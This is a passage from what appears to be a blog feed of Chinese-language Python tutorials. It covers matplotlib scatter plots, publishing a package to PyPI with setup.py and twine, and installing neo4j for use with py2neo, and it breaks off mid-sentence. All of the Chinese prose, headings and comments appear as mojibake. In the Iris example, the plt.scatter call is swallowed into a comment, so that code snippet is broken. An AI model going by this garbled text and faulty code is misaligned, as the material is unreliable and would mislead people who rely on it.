class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p><strong>plt.scatter</strong>å®ç°</p><ul><li><strong>æ•ˆæœ</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112429223.png#pic_center =500x400" alt="" style="zoom:50%;" /></li></ul></blockquote><div class="code-wrapper"><pre><code><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'plt.scatter'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></code></pre><h3 id="5-3-2-å‡½æ•°å®šä¹‰"><a href="#5-3-2-å‡½æ•°å®šä¹‰" class="headerlink" title="5.3.2 å‡½æ•°å®šä¹‰"></a>5.3.2 å‡½æ•°å®šä¹‰</h3><p><code>plt.scatter()</code>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scatter</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> norm<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>alpha<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> linewidths<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> verts<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> hold<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><div class="table-container"><table><thead><tr><th style="text-align:center">å‚æ•°</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center"><strong>x</strong></td><td style="text-align:center">ç‚¹æ¨ªåæ ‡</td></tr><tr><td style="text-align:center"><strong>y</strong></td><td style="text-align:center">ç‚¹çºµåæ ‡(å¤§å°ä¸xç›¸ç­‰)</td></tr><tr><td style="text-align:center">s</td><td style="text-align:center">æ ‡è®°å¤§å°ï¼ŒæŒ‡å®šç‚¹çš„å¤§å°</td></tr><tr><td style="text-align:center">c</td><td style="text-align:center">æ ‡è®°é¢œè‰²ï¼ˆå¦‚â€™redâ€™,â€™râ€™ï¼‰</td></tr><tr><td style="text-align:center"><strong>maker</strong></td><td style="text-align:center">æ ‡è®°æ ·å¼ï¼Œå¦‚â€™oâ€™æ˜¯åœ†åœˆï¼Œâ€™xâ€™æ˜¯å‰å·</td></tr><tr><td style="text-align:center"><strong>alpha</strong></td><td style="text-align:center">é€æ˜åº¦</td></tr></tbody></table></div><h3 id="5-3-3-å¤šä¸ªç‚¹é›†"><a href="#5-3-3-å¤šä¸ªç‚¹é›†" class="headerlink" title="5.3.3 å¤šä¸ªç‚¹é›†"></a>5.3.3 å¤šä¸ªç‚¹é›†</h3><p>æ•£ç‚¹å›¾ä¸­å¯èƒ½æœ‰ä¸¤ç±»æˆ–ä»¥ä¸Šä¸åŒç±»å‹çš„ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ç»˜åˆ¶å‡ºæ¥å¹¶è¿›è¡Œæ ‡æ³¨å¯¹æ¯”ï¼Œè¿™æ—¶å€™é‡‡ç”¨<code>plt.scatter()</code>å‡½æ•°æ›´æ–¹ä¾¿ã€‚</p><ul><li><p><strong>æ•ˆæœ</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112506907.png#pic_center =500x400" style="zoom:50%;" /></p></li><li><p><strong>ä»£ç </strong>   </p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>colors <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c <span class="token operator">=</span> colors<span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'plt.scatter'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>colorbar<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li><li><p><strong><code>Iris</code>æ•°æ®æ•£ç‚¹å›¾</strong><br><code>Iris</code>æ˜¯æœºå™¨å­¦ä¹ åˆ†ç±»é—®é¢˜ä¸­å¸¸ç”¨çš„æ•°æ®ï¼ŒåŒ…å«150ä¸ªæ•°æ®ï¼Œå…±ä¸‰ç±»ï¼Œæ¯ä¸ªæ•°æ®åŒ…å«4ä¸ªå±æ€§ã€‚æˆ‘ä»¬ç”¨æ•£ç‚¹å›¾ç»˜åˆ¶è¿™ä¸‰ç±»æ•°æ®ï¼Œçœ‹çœ‹å®ƒä»¬çš„åˆ†å¸ƒæƒ…å†µã€‚  </p><p><strong>æ•ˆæœ</strong>  </p><ul><li><img src="https://img-blog.csdnimg.cn/20200306112526442.png#pic_center =500x400" alt="" style="zoom:50%;" /></li></ul></li></ul><ul><li><strong>ä»£ç </strong>    <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> load_irisiris <span class="token operator">=</span> load_iris<span class="token punctuation">(</span><span class="token punctuation">)</span>features <span class="token operator">=</span> iris<span class="token punctuation">.</span>data<span class="token punctuation">.</span>T  <span class="token comment"># è½¬ç½®ç”¨äºå•ç‹¬è·å–æ‰€æœ‰ç‰¹å¾plt.scatter(features[0],features[1],alpha=0.4,c=iris.target)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'èŠ±è¼é•¿åº¦(cm)'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'èŠ±è¼å®½åº¦(cm)'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Irisæ•°æ®åˆ†å¸ƒ(æŒ‰ç…§èŠ±è¼é•¿å®½)'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>colorbar<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h1 id="6-æ€»ç»“"><a href="#6-æ€»ç»“" class="headerlink" title="6. æ€»ç»“"></a>6. æ€»ç»“</h1><p>æœ¬æ–‡ç®€å•åœ°è®²è¿°äº†<code>Matplotlib</code>çš„ä½¿ç”¨ï¼Œä»¥åŠéƒ¨åˆ†å¸¸ç”¨å›¾çš„ç»˜åˆ¶ï¼Œæ›´å¤šçš„å†…å®¹åœ¨åæœŸç”¨åˆ°çš„æ—¶å€™ä¼šæ›´æ–°ä¸Šæ¥ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>matplotlib</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•å‘å¸ƒè‡ªå·±çš„pythonåŒ…åˆ°PYPIï¼Ÿç»™è‡ªå·±ç¼–å†™å·¥å…·ä»£ç </title>
    <link href="/article/50503.html"/>
    <url>/article/50503.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨æˆ‘ç¼–å†™æŸä¸€ä¸ªé¡¹ç›®çš„æ—¶å€™ï¼Œæ—¶å¸¸ä¼šå‘ç°æˆ‘åˆç”¨åˆ°äº†ä¹‹å‰æŸä¸ªé¡¹ç›®ä¸­å†™è¿‡çš„åŠŸèƒ½ï¼Œè¿™ä¸ªæ—¶å€™åªèƒ½æ‰¾åˆ°ä»¥å‰çš„é¡¹ç›®ï¼Œå°†ä»£ç copyåˆ°æ–°é¡¹ç›®ä¸­è°ƒç”¨ã€‚è¿™æ˜¯ä¸€ç§éå¸¸lowçš„åšæ³•ï¼Œä¸€æ–¹é¢ï¼ŒæŸ¥æ‰¾ä»¥å‰çš„ä»£ç ï¼Œè´¹æ—¶è´¹åŠ›ï¼›å¦ä¸€æ–¹é¢ï¼Œä¸€çœ‹å°±æ˜¯åˆå­¦è€…å–œæ¬¢å¹²çš„ï¼Œä½œä¸ºä¸€ä¸ªç é¾„ä¹Ÿç®—æœ‰å‡ å¹´çš„äººï¼Œè¿˜ä¸€ç›´æ»¡è¶³äºä»¥å‰è¿™ç§åšæ³•ï¼Œæ˜¯æ²¡æœ‰åŠæ³•è¿›æ­¥çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/20200419164648649.png#pic_center =110x100" alt=""><br>ç½‘ä¸Šå…¶å®ä¹Ÿæœ‰è®¸å¤šç±»ä¼¼çš„æ•™ç¨‹ï¼Œä½†æ€»è§‰å¾—ä¸å¤Ÿç®€ç»ƒã€å‹å¥½ï¼Œå¾ˆå¤šåœ°æ–¹æ²¡æœ‰è§£é‡Šæ¸…æ¥šï¼Œå› æ­¤å¹²è„†è‡ªå·±å†™ä¸€ä¸ªï¼Œæ–¹ä¾¿è‡ªå·±ä¹Ÿæ–¹ä¾¿ä»–äººã€‚</p><h2 id="åŸºç¡€å‡†å¤‡"><a href="#åŸºç¡€å‡†å¤‡" class="headerlink" title="åŸºç¡€å‡†å¤‡"></a>åŸºç¡€å‡†å¤‡</h2><p>å®Œæˆé¡¹ç›®åˆ›ç«‹ã€å·¥å…·ä»£ç ç¼–å†™ã€å¿…è¦æ–‡ä»¶æ·»åŠ çš„æ“ä½œ</p><h3 id="åˆ›å»ºé¡¹ç›®"><a href="#åˆ›å»ºé¡¹ç›®" class="headerlink" title="åˆ›å»ºé¡¹ç›®"></a>åˆ›å»ºé¡¹ç›®</h3><p>è¿™éƒ¨åˆ†åº”è¯¥éƒ½é©¾è½»å°±ç†Ÿï¼Œå¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªç›®å½•æˆ–è€…ç”¨pycharmåˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼Œå¹¶åœ¨æ–°é¡¹ç›®ä¸‹åˆ›å»ºä¸€ä¸ªåŒåç›®å½•ï¼Œä¾‹å¦‚æˆ‘åˆ›å»ºä¸€ä¸ª<code>cptools</code>é¡¹ç›®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTk5NWQ4N2QwMjEyLnBuZw?x-oss-process=image/format,png" alt=""></p><ul><li><strong>ä¸ºä»€ä¹ˆè¦åœ¨é¡¹ç›®ä¸‹æ–°å»ºç›®å½•è€Œä¸æ˜¯ç›´æ¥å°†ä»£ç æ”¾åœ¨æ€»ç›®å½•ä¸‹ï¼Ÿ</strong><blockquote><p>æ€»ç›®å½•ä¸‹é™¤äº†å­˜æ”¾ä»£ç å¤–ï¼Œä¸€èˆ¬è¿˜ä¼šå­˜æ”¾READMEï¼ŒLICENSEä»¥åŠè‡ªåŠ¨åˆ›å»ºçš„buildç›®å½•ç­‰ï¼Œå› æ­¤ç”¨è¿™ç§æ–¹å¼å°†ä»£ç éš”ç¦»å¼€</p></blockquote></li></ul><h3 id="ç¼–å†™å·¥å…·ä»£ç "><a href="#ç¼–å†™å·¥å…·ä»£ç " class="headerlink" title="ç¼–å†™å·¥å…·ä»£ç "></a>ç¼–å†™å·¥å…·ä»£ç </h3><p>è¿™æ—¶å€™å°±å¯ä»¥åœ¨é¡¹ç›®ä¸­ç¼–å†™ä½ çš„ä¸ªäººä»£ç äº†ï¼Œé€šå¸¸æ¥è¯´æˆ‘ä»¬ä»£ç ä¸»è¦ç¼–å†™ä¸ºç±»å’Œå‡½æ•°ä¸¤ç§ï¼Œæ–¹ä¾¿è°ƒç”¨ã€‚æˆ‘ç®€å•åœ°åˆ›å»ºäº†ä¸€ä¸ªç±»å’Œå‡½æ•°ï¼Œæ”¾åˆ°ä¸€ä¸ª<code>.py</code>æ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="https://img-blog.csdnimg.cn/20200419164731520.png#pic_center =400x200" alt=""></p><p>åŒæ—¶ä¸ºäº†è¯´æ˜è¿™æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œéœ€è¦æ·»åŠ ä¸€ä¸ª<code>__init__.py</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬ç»å¸¸çœ‹åˆ°ä¸€ä¸ªåŒ…ç›´æ¥æä¾›å‡½æ•°çš„å½¢å¼ï¼Œä¾‹å¦‚<code>requests.get()</code>ï¼Œè€Œä¸æ˜¯<code>requests.utils.get()</code>ï¼Œæ˜¯å› ä¸ºåœ¨<code>__init__.py</code>ä¸­å°†è¯¥ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æ–¹æ³•åšäº†å¯¼å…¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å°†<code>hello_cp.py</code>çš„æ‰€æœ‰å†…å®¹å¯¼å…¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç”¨<code>cptools.hello()</code>å»è°ƒç”¨<code>hello</code>å‡½æ•°äº†ï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="https://img-blog.csdnimg.cn/20200419164749953.png#pic_center =400x200" alt=""></p><blockquote><p>nameå±æ€§æ˜¯æŒ‡å®šåŒ…åï¼Œå’Œç›®å½•ä¸€æ ·å³å¯</p></blockquote><h3 id="setup-py"><a href="#setup-py" class="headerlink" title="setup.py"></a>setup.py</h3><p>è¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨äºå‘Šè¯‰setuptoolsæˆ‘ä»¬é¡¹ç›®çš„ç‰ˆæœ¬å·ç­‰ä¿¡æ¯çš„ï¼Œåˆ›å»ºåœ¨é¡¹ç›®æ€»ç›®å½•ä¸‹å³å¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://img-blog.csdnimg.cn/20200419164805629.png#pic_center =400x300" alt=""></p><h3 id="LICENSE"><a href="#LICENSE" class="headerlink" title="LICENSE"></a>LICENSE</h3><p>LICENSEåœ¨<code>github</code>ä¸Šåˆ›å»ºä¹‹åˆå¯ä»¥é€‰æ‹©ï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZjI1MDBkZTUwOTI5LnBuZw#pic_center =618x590" alt=""><br>ä¸åŒçš„å¼€æºåè®®åŒ…å«ä¸åŒçš„å¼€æºè¦æ±‚ï¼Œå…·ä½“å¯è‡ªå·±æŸ¥è¯¢ï¼Œä¸€èˆ¬æˆ‘å»ºè®®é‡‡ç”¨<code>GNU v3.0</code></p><h3 id="README-md"><a href="#README-md" class="headerlink" title="README.md"></a>README.md</h3><p>è¿™éƒ¨åˆ†æ˜¯å¯¹æ•´ä¸ªé¡¹ç›®çš„æè¿°ï¼Œå¯ä»¥ç¼–å†™å¯¹é¡¹ç›®çš„ä»‹ç»ï¼Œè¿™ä¸ªæ—¶å€™ä½ çš„ç›®å½•åº”è¯¥å’Œæˆ‘ä¸‹å›¾æ˜¾ç¤ºçš„ç±»ä¼¼<br><img src="https://img-blog.csdnimg.cn/20200419164837863.png#pic_center =400x150" alt=""></p><h2 id="æ‰“åŒ…å‘å¸ƒåˆ°PYPI"><a href="#æ‰“åŒ…å‘å¸ƒåˆ°PYPI" class="headerlink" title="æ‰“åŒ…å‘å¸ƒåˆ°PYPI"></a>æ‰“åŒ…å‘å¸ƒåˆ°PYPI</h2><p>åˆ°å‰é¢ä¸ºæ­¢ï¼Œå¿…é¡»çš„æ–‡ä»¶æˆ‘ä»¬å·²ç»åˆ›å»ºå®Œæ¯•ï¼Œä¸‹é¢å°±æ˜¯å¦‚ä½•æ‰“åŒ…å’Œå‘å¸ƒçš„è¿‡ç¨‹ã€‚</p><h3 id="æ‰“åŒ…é¡¹ç›®"><a href="#æ‰“åŒ…é¡¹ç›®" class="headerlink" title="æ‰“åŒ…é¡¹ç›®"></a>æ‰“åŒ…é¡¹ç›®</h3><p>åœ¨æ€»ç›®å½•ä¸‹æ‰§è¡Œå¦‚ä¸‹ä»£ç <br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">python setup.py sdist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>è¿™æ—¶å€™å°±ä¼šç”Ÿæˆä¸€ä¸ªdistç›®å½•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTk5NjdhMDI3ZDBmLnBuZw#pic_center =400x200" alt="">  </p><h3 id="å‘å¸ƒåˆ°PYPI"><a href="#å‘å¸ƒåˆ°PYPI" class="headerlink" title="å‘å¸ƒåˆ°PYPI"></a>å‘å¸ƒåˆ°PYPI</h3><ul><li><p>å…ˆç‚¹å‡»<a href="https://pypi.org/account/register/">è¿™é‡Œ</a>æ³¨å†Œä¸€ä¸ªpypiè´¦å·</p><blockquote><p>éœ€è¦éªŒè¯é‚®ç®±</p></blockquote></li><li><p>ç”¨<code>twine</code>æ¨¡å—ä¸Šä¼ åˆ°pypi  </p>  <div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">twine upload dist&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>  <img src="https://img-blog.csdnimg.cn/20200419164925896.png#pic_center =400x80" alt=""></p><blockquote><p>å¦‚æœæ²¡æœ‰twineï¼Œç”¨<code>pip install twine</code></p></blockquote></li></ul><h3 id="æŸ¥çœ‹æˆ‘ä»¬çš„é¡¹ç›®"><a href="#æŸ¥çœ‹æˆ‘ä»¬çš„é¡¹ç›®" class="headerlink" title="æŸ¥çœ‹æˆ‘ä»¬çš„é¡¹ç›®"></a>æŸ¥çœ‹æˆ‘ä»¬çš„é¡¹ç›®</h3><p>åˆ°<a href="https://pypi.org/search/?q=cptools">pypi</a>ä¸Šæœç´¢<code>cptools</code><br><img src="https://img-blog.csdnimg.cn/20200419164946313.png#pic_center =400x200" alt=""></p><blockquote><p>è¿™æ—¶å€™è¯´æ˜æˆ‘ä»¬å¯ä»¥ç”¨<code>pip install cptools</code>å®‰è£…æˆ‘ä»¬çš„æ¨¡å—äº†</p></blockquote><h2 id="æµ‹è¯•æ¨¡å—ä½¿ç”¨"><a href="#æµ‹è¯•æ¨¡å—ä½¿ç”¨" class="headerlink" title="æµ‹è¯•æ¨¡å—ä½¿ç”¨"></a>æµ‹è¯•æ¨¡å—ä½¿ç”¨</h2><ul><li><code>pip install cptools</code><br>  <img src="https://img-blog.csdnimg.cn/20200419165008503.png#pic_center =400x200" alt=""></li><li>è°ƒç”¨å‡½æ•°<br>  <img src="https://img-blog.csdnimg.cn/20200419165019581.png#pic_center =400x100" alt=""></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è‡³æ­¤ï¼Œä¸€ä¸ªå®Œæ•´çš„pythonåŒ…ç¼–å†™å‘å¸ƒè¿‡ç¨‹å°±ç»“æŸäº†ï¼Œä»¥åæœ‰æ–°çš„å†…å®¹å‘å¸ƒäº†ä¾ç„¶æ˜¯ç”¨ç›¸åŒçš„æ–¹æ³•æ›´æ–°åˆ°pypiä½¿ç”¨å³å¯ï¼Œä¸è¿‡è®°å¾—æ›´æ–°ä½ çš„ç‰ˆæœ¬å·å’Œgithubå†…å®¹å“¦ï½</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>pypi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>py2neo å¿«é€Ÿä¸Šæ‰‹</title>
    <link href="/article/53311.html"/>
    <url>/article/53311.html</url>
    
    <content type="html"><![CDATA[<h1 id="py2neo-å¿«é€Ÿä¸Šæ‰‹"><a href="#py2neo-å¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="py2neo å¿«é€Ÿä¸Šæ‰‹"></a>py2neo å¿«é€Ÿä¸Šæ‰‹</h1><h2 id="py2neoç®€ä»‹"><a href="#py2neoç®€ä»‹" class="headerlink" title="py2neoç®€ä»‹"></a>py2neoç®€ä»‹</h2><p><code>neo4j</code> æ˜¯ç›®å‰æœ€æµè¡Œçš„å›¾æ•°æ®åº“ï¼Œåœ¨å»ºç«‹çŸ¥è¯†å›¾è°±çš„æ—¶å€™ç»å¸¸ç”¨äºæ•°æ®çš„å­˜å‚¨å’Œæ£€ç´¢ï¼Œ<code>neo4j</code> ç›¸è¾ƒ<code>mysql</code> ç­‰å…¶ä»–å…³ç³»å‹æ•°æ®åº“æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éå¸¸å®¹æ˜“æŸ¥çœ‹æ•°æ®ä¸æ•°æ®ä¹‹é—´çš„è”ç³»ï¼Œå®ƒå°†æ‰€æœ‰æ•°æ®è½¬æ¢æˆ<strong>å›¾</strong>çš„å½¢å¼ï¼Œè®©ä½¿ç”¨è€…èƒ½å¤Ÿå¿«é€Ÿå‘ç°è•´å«çš„è”ç³»ã€‚ä¸‹é¢æ˜¯<code>neo4j</code> çš„ä¸»è¦ç•Œé¢å’Œç›¸åº”çš„æ•°æ®å›¾ä¾‹ï¼ˆå°„é›•è‹±é›„ä¼ äººç‰©çŸ¥è¯†å›¾è°±ï¼‰ã€‚</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210219123737.png" alt="image-20210219123737557"></p><p>ä½†æ˜¯ï¼Œç›´æ¥åœ°å¯¹<code>neo4j</code>æ“ä½œï¼Œè™½ç„¶æœ‰ç›¸åº”çš„<code>cypher</code>è¯­å¥ï¼Œå´å¹¶ä¸é€‚åˆåœ¨ç¼–ç¨‹çš„è¿‡ç¨‹ä¸­æ“ä½œã€‚<code>py2neo</code>å°±æ˜¯ä¸€ä¸ªè¿æ¥äº†<code>python</code>åˆ°<code>neo4j</code>æ•°æ®åº“çš„åº“ï¼Œå®ƒä¸ä»…è®©ç¨‹åºæœ¬èº«å¯ä»¥ç›´æ¥æ‰§è¡Œ<code>cypher</code>è¯­å¥åˆ›å»ºå›¾æ•°æ®åº“ï¼Œä¹Ÿæä¾›äº†æ›´äººæ€§åŒ–çš„æ“ä½œï¼Œç¬¦åˆé¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ€æƒ³ã€‚</p><h2 id="neo4j"><a href="#neo4j" class="headerlink" title="neo4j"></a>neo4j</h2><p>åœ¨è¿›å…¥ä½¿ç”¨<code>py2neo</code>ä¹‹å‰ï¼Œè¿˜æ˜¯è¦å…ˆå®‰è£…å¥½<code>neo4j</code>ï¼Œäº†è§£ä¸€äº›åŸºç¡€çš„<code>cypher</code>è¯­å¥ç”¨æ³•ï¼ˆè™½ç„¶æˆ‘è‡ªå·±åŸºæœ¬ä¸æ€ä¹ˆç”¨å®ƒï¼‰ï¼Œç„¶è€Œ<code>neo4j</code>çš„ä»‹ç»ä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œç½‘ä¸Šå·²æœ‰å¤§ç¯‡å¹…çš„æ–‡ç« å»è®²è¿°æ€ä¹ˆä½¿ç”¨å®ƒã€‚å› æ­¤ï¼Œè¿™é‡Œæˆ‘ä¼šç»™å‡ºå¿…è¦çš„æ“ä½œæ­¥éª¤ï¼ˆé¿å…å†å»çœ‹å†—é•¿çš„æ–‡æ¡£ï¼‰å’Œæˆ‘ä¸ªäººæ¨èçš„åšå®¢æ–‡ç« ï¼ˆåŒ…å«æ›´ä¸ºè¯¦ç»†çš„è¯´æ˜ï¼‰ã€‚</p><h3 id="å®‰è£…ä¸å¯åŠ¨"><a href="#å®‰è£…ä¸å¯åŠ¨" class="headerlink" title="å®‰è£…ä¸å¯åŠ¨"></a>å®‰è£…ä¸å¯åŠ¨</h3><ul><li>å®‰è£…</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;neo4j.com&#x2F;artifact.php?name&#x3D;neo4j-community-3.4.1-unix.tar.gztar -zxvf neo4j-community-3.4.1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><blockquote><p>å®‰è£…çš„ç¯å¢ƒå»ºè®®æ”¾åœ¨linuxç³»ç»Ÿä¸‹ï¼Œè¿™æ˜¯æˆ‘ä¸ªäººçš„çˆ±å¥½ä¹Ÿæ˜¯ä¸€ä¸ªå»ºè®®ï¼ˆæ‰€æœ‰éƒ¨ç½²çš„æœåŠ¡ã€æ•°æ®åº“ç­‰ä¸œè¥¿éƒ½æ”¾åˆ°linuxç³»ç»Ÿä¸­ï¼‰ï¼Œä¸ä»…ä»…æ˜¯å®‰è£…æ›´åŠ æ–¹ä¾¿ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é¿å…åç»­è®¸å¤šçš„ä¸ä¾¿ï¼Œå¦‚æœä½ ä¸»åŠ›ç³»ç»Ÿæ˜¯windowsï¼Œé‚£ä¹ˆè™šæ‹Ÿæœº+ç½‘ç»œæ¡¥æ¥æ¨¡å¼æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©</p></blockquote><ul><li>å¯åŠ¨</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">cd <span class="token builtin">bin</span><span class="token operator">/</span> <span class="token punctuation">.</span><span class="token operator">/</span>neo4j start   <span class="token comment"># console | start | stop | restart | status</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p>å½“å‘ç°å¯åŠ¨æˆåŠŸåï¼Œè¿›å…¥<code>http://localhost:7474</code></p><ul><li>æ¨èé˜…è¯»æ–‡çŒ®<ul><li><a href="https://juejin.cn/post/6844904180906197006">https://juejin.cn/post/6844904180906197006</a></li><li><a href="https://zhuanlan.zhihu.com/p/88745411">https://zhuanlan.zhihu.com/p/88745411</a></li></ul></li></ul><h2 id="py2neoä½¿ç”¨"><a href="#py2neoä½¿ç”¨" class="headerlink" title="py2neoä½¿ç”¨"></a>py2neoä½¿ç”¨</h2><blockquote><p>py2neoæ”¯æŒç›´æ¥æ‰§è¡Œ<code>cypher</code>è¯­å¥ï¼Œå¦‚æœä½ å¯¹<code>cypher</code>è¯­å¥ç†Ÿæ‚‰çš„è¯ï¼Œå°†ä½ 